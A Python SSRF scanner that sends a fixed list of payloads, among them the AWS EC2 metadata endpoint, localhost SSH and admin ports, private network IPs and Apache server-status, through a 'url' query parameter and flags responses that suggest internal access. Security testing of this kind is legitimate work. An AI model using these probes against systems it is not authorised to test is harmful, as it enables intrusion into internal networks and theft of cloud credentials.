import requests
from urllib.parse import urljoin

# List of common SSRF payloads
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS EC2 metadata endpoint
    "http://127.0.0.1:22",                      # Testing localhost SSH port
    "http://localhost:8080/",                   # Testing common localhost port
    "http://10.0.0.1/",                         # Testing private network IPs
    "http://192.168.1.1/",                      # Testing another private network IP
    "http://example.com:22/",                   # Checking non-standard ports
    "http://localhost/server-status"            # Apache server-status
]

# Function to send the SSRF payload and capture the response
def send_ssrf_payload(url, payload):
    try:
        response = requests.get(url, params={"url": payload}, timeout=10)
        return response
    except requests.RequestException as e:
        print(f"Error while sending SSRF payload: {e}")
        return None

def analyze_ssrf_response(url, payload, response):
    findings = []
    if response:
        if response.status_code == 200:
            if payload == "http://169.254.169.254/latest/meta-data/":
                findings.append("SSRF detected: Possible access to AWS EC2 metadata, exposing sensitive cloud data.")
            elif payload == "http://127.0.0.1:22":
                findings.append("SSRF detected: Localhost SSH port (22) is accessible, indicating potential internal exposure.")
            elif payload == "http://localhost:8080/":
                findings.append("SSRF detected: Internal service on localhost:8080 is accessible, which may expose admin interfaces.")
            elif payload == "http://10.0.0.1/":
                findings.append("SSRF detected: Internal IP (10.x.x.x range) is reachable, posing a risk of network probing.")
            elif payload == "http://192.168.1.1/":
                findings.append("SSRF detected: Access to internal router/admin panel at 192.168.1.1 is possible.")
            elif payload == "http://example.com:22/":
                findings.append("SSRF detected: Non-standard port 22 on example.com is accessible, indicating potential external service exposure.")
            elif payload == "http://localhost/server-status":
                findings.append("SSRF detected: Apache server-status page on localhost is accessible, potentially revealing server details.")
        elif response.status_code in [301, 302]:
            redirected_url = response.headers.get('Location', '')
            if redirected_url and redirected_url != payload:
                findings.append(f"Possible SSRF redirect: Server redirected to {redirected_url}, indicating potential SSRF exploitation.")
    
    return findings

def scan_ssrf(url, params=None):
    issues = []

    for payload in SSRF_PAYLOADS:
        full_url = urljoin(url, payload)
        response = send_ssrf_payload(url, full_url)
        findings = analyze_ssrf_response(url, payload, response)
        if findings:
            issues.extend(findings)

    return issues
